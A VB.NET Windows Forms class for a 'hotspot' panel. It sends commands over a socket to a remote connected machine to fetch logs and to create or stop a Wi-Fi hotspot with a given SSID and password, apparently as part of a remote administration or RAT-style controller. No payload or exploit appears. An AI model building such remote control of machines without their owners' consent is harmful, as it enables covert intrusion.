Public Class hotspot
    Public sock As Integer
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


     



#End Region
    Private Sub Label9_Click(sender As System.Object, e As System.EventArgs) Handles Label9.Click
        Me.Close()
    End Sub
    Dim currh As Double = 0.0
    '743; 328
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If currh < 327 Then
            currh += 32.8
            Me.Size = New Size(Me.Width, currh)

        Else
            Timer1.Stop()
            Main.S.Send(sock, "getlogs")
            Main.S.Send(sock, "getlog")
        End If
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Main.S.Send(sock, "stophotspot")
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        If ssid.Text = vbNullString Then
            MsgBox("SSID Cannot be empty")
        Else
            If key.Text.Length >= 8 Then
                Main.S.Send(sock, "createwifi" & Main.Yy & ssid.Text & Main.Yy & key.Text)
            Else
                MsgBox("Password at least 8 charachters")
            End If
        End If
    End Sub

    Private Sub hotspot_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer1.Start()
    End Sub
End Class